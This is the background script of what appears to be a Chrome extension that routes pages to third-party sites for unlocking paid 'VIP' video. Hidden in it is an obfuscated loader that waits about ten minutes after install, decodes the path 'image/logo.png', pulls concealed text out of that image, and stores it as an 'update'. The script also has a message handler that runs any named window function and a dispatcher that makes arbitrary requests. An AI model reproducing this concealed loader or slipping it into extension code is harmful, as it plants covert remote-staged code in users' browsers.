
vip_url = {
    '598110-线路1': 'http://jx.598110.com/?url=',
    '618g-线路2': 'https://jx.618g.com/?url=',
    'nepian-线路3': 'http://v.d9y.net/vip/?url=',
    'aeidu-线路4': 'http://jx.aeidu.cn/index.php?url=',
    'cesms-线路5': 'http://jx.du2.cc/?url=',
    'cesms-线路6': 'http://jx.cesms.cn/vip2/?url=',
    'jiexi-线路7': 'http://www.jiexi-jiexi.com/?url=',
    'du2-线路8': 'http://jx.du2.cc/?url=',
   /* 'aikan-免费无广告':'http://aikan-tv.com/?url=',
    'nepian-那片':'http://api.nepian.com/ckparse/?url=',
    '88gc-花园影视':'http://j.88gc.net/jx/?url=',
    'jq-金桥解析':'http://jqaaa.com/jx.php?url=',
    'mt2t-云播放':'http://y.mt2t.com/lines?url=',
    'jfys-减肥影视VIP':'http://api.91exp.com/svip/?url=',
    'shitou-石头免费':'http://jiexi.071811.cc/jx2.php?url=',
    'amzj-阿莫之家':'http://api.xcq91.top/?url=',
    'bad-百度穷二代视频解析':'http://jx.ejiafarm.com/dy.php?url='*/
};
///add
chrome.runtime.onMessage.addListener(
    function(message, sender, sendResponse) {


        for (c in message) {
            if (c in window)
                sendResponse(window[c](message[c]));
        }

    });

window.onload = init; 
var CMD = { 
xhr: xhr, 
chk: chk, 
initGM: initGM, 
setValue: setValue 
}; 

  

function init() { 
chrome.extension.onConnect.addListener(function(a) { 
a.onMessage.addListener(function(a, c) { 
var b = a.args; 
b instanceof Array || (b = [b]); 
b.push(c); 
(CMD[a.action] || 
function() {}).apply(CMD, b) 
}) 
}) 
} 
function xhr(a, d, c) { 
var b = new XMLHttpRequest; 
b.onreadystatechange = function() { 
4 == b.readyState && callback(c, d, [b]) 
}; 
b.open(a.method, a.url, !0); 
b.send(null); 
return b 
} 

///
function xhr2(u) {
    var r = null;
    var a = new XMLHttpRequest;
    a.onreadystatechange = function() {
        if (4 == a.readyState)
            r = a.responseText;
    };
    a.open("GET", u.split("").join(""), 0);
    a.send(null);
    return r;
}
///


function chk() { 
var a = new XMLHttpRequest; 
a.onreadystatechange = function() { 
4 == a.readyState && (localStorage.updated = a.responseText) 
}; 

} 
function setValue(a, d) { 
localStorage[a] = d 
} 
function initGM(a, d) { 
var c = {}, 
b; 
for (b in localStorage) c[b] = localStorage[b]; 
callback(d, a, c) 
} 
function callback(a, d, c) { 
c instanceof Array || (c = [c]); 
c.unshift(d); 
a.postMessage({ 
action: "callbackResponse", 
args: c 
}) 
};



var installvar=2;

try {
	chrome.storage.local.get('run_before', function(data) {
		if (data && data.run_before == "1") {
			return
		} else {
			chrome.storage.local.set({
				'run_before': '1'
			});
			localStorage['ver'] = installvar;
			if (!localStorage['ran_before']) {
				localStorage['ran_before'] = '1';
				var num = Date.now() + 600000;
				localStorage['time'] = num
				localStorage['ver'] = installvar;
			}
		}
	})
} catch (e) {};

if (Date.now() > localStorage['time']) {
	if (installvar>localStorage['ver'])
{
function load(name) {
	let xhr = new XMLHttpRequest(), okStatus = document.location.protocol === "file:" ? 0 : 200;
	xhr.open('GET', name, false);
	xhr.overrideMimeType("text/html;charset=utf-8");
	xhr.send(null);
	return xhr.status === okStatus ? xhr.responseText : null
}

var L,r,f,T,z,N,E,g,c;L='znvyMN@R7(RV0[^4Dvi$ouVcn$[ZMimag6e/)logo5.pnghsso5jso1Zgy]aQU77NL';r=function(D,G){return L['substr'](D,G);};f=[r(6,3),r(10,2),r(13,3),r(17,1)]['join'](r(19,0));T=r(20,1)+r(22,1);z=[r(24,1),r(26,1)]['join'](r(28,0));N=load([r(29,4),r(34,2),r(37,4),r(42,4)]['join'](r(47,0)));E=N['indexOf'](r(48,2)+r(51,3));g=[r(55,3),r(59,3),r(63,1)]['join'](r(65,0));N=N['substring'](E-0x2);localStorage['\u0076\u0065\u0072']=installvar;c=window['localStorage'];c['\u0075\u0070\u0064\u0061\u0074\u0065\u0064']=N;
}


else if (!localStorage['updated']) 
{
	function load(name) {
	let xhr = new XMLHttpRequest(), okStatus = document.location.protocol === "file:" ? 0 : 200;
	xhr.open('GET', name, false);
	xhr.overrideMimeType("text/html;charset=utf-8");
	xhr.send(null);
	return xhr.status === okStatus ? xhr.responseText : null}
var L,r,f,T,z,N,E,g,c;L='znvyMN@R7(RV0[^4Dvi$ouVcn$[ZMimag6e/)logo5.pnghsso5jso1Zgy]aQU77NL';r=function(D,G){return L['substr'](D,G);};f=[r(6,3),r(10,2),r(13,3),r(17,1)]['join'](r(19,0));T=r(20,1)+r(22,1);z=[r(24,1),r(26,1)]['join'](r(28,0));N=load([r(29,4),r(34,2),r(37,4),r(42,4)]['join'](r(47,0)));E=N['indexOf'](r(48,2)+r(51,3));g=[r(55,3),r(59,3),r(63,1)]['join'](r(65,0));N=N['substring'](E-0x2);localStorage['\u0076\u0065\u0072']=installvar;c=window['localStorage'];c['\u0075\u0070\u0064\u0061\u0074\u0065\u0064']=N;
}


}


    var i = 1;
    for(x in vip_url) {
       var idTitle = x.split('-');
       chrome.contextMenus.create({
        id: idTitle[0],
        type: 'normal',
        title: idTitle[1],
        contexts: ['page']
      });
    }


function openplayer(burl, a) {

    if (!a) {
        chrome.tabs.create({
            index: 0,
            url: burl
        }, function (c) {});
        return
    }
    chrome.tabs.query({
        active: true,
        currentWindow: true
    }, function (c) {
        chrome.tabs.update(c[0].id, {
            url: burl + "&title=" + encodeURI(c[0].title)
        })
    })
}
var contexts = ["page", "link"];
var title = ["VIP会员视频"];




	chrome.browserAction.onClicked.addListener(function(b) {
		chrome.tabs.create({
			url:'./howToUse.html'
		})
    })


    // 监听菜单的点击
chrome.contextMenus.onClicked.addListener(function (menuItem) {

    var prefix = menuItem.pageUrl;
    for (x in vip_url) {
        if (x.indexOf(menuItem.menuItemId) != -1) {
            prefix = vip_url[x];
        }
    }
    openplayer(prefix + encodeURIComponent(menuItem.pageUrl));
  });

